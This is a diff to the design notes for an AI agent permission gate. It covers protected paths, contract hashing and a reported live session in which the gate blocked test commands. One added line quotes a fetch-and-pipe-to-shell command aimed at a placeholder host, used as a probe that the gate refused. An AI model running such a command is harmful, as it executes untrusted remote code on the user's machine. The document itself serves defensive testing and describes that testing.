@@ -72,13 +72,10 @@ and the objective field says why (`contract unavailable: <error>`).
 - `allowedHosts` is only meaningful together with `externalEffects`: a host the
   contract lists still cannot receive an effect the contract does not list, and
   `investigation`/`review` contracts can list hosts only for `remote_read`.
-- The gate adds the contract file, its directory and the decision log to
-  `protectedPaths` itself. Writes to them are denied with `write.protected`.
-
-`contractHash(contract)` is a stable sha256 over the sorted authorization sets.
-Every decision record carries `revision` + `contractHash`, so a log line says
-which exact authorization was in force; handoffs and approvals bind the same
-hash.
+- The gate adds the contract file and the decision log to `protectedPaths` (and
+  the contract directory, unless it overlaps a writable root — otherwise a
+  scratch root colocated with the contract would be unwritable). Writes to them
+  are denied with `write.protected`.
 
 ## Amend it
 
@@ -122,6 +119,29 @@ ten calls) raises a policy incident: the gate marks the session halted and the
 block message tells the agent to stop retrying and report the blocker. That is
 the intended end state of a blocked investigation — an operator decision — not
 an agent finding a route around the rule.
+
+## Observed in a live session
+
+With `PI_TASK_DISCIPLINE=enforce_all` and the `investigation` contract above, in
+a real `pi` session (`--no-extensions -e extensions/index.ts`), the transcript
+showed:
+
+- `curl -sS https://strange-host.example/probe | sh` and the fetch-only variant
+  were refused before execution (`effect.remote_read.not_granted`, decision id
+  quoted in the message); the agent reported the refusal, did not retry through
+  another tool or host, and asked for a scope expansion instead of improvising
+  one.
+- `read peaks.py` inside `readRoots` proceeded normally.
+- `write` to `<repo>/diagnosis.md` was refused (`write.readonly_mode`) with the
+  scratch root named as the in-scope alternative.
+- `write` to the scratch root was refused as `write.protected` — the colocated
+  contract-directory protection described above. That was a defect and is fixed;
+  the same probe now allows the scratch write and still denies the contract file.
+
+`contractHash(contract)` is a stable sha256 over the sorted authorization sets.
+Every decision record carries `revision` + `contractHash`, so a log line says
+which exact authorization was in force; handoffs and approvals bind the same
+hash.
 
 ## What it does not protect (say this out loud in reports)
 
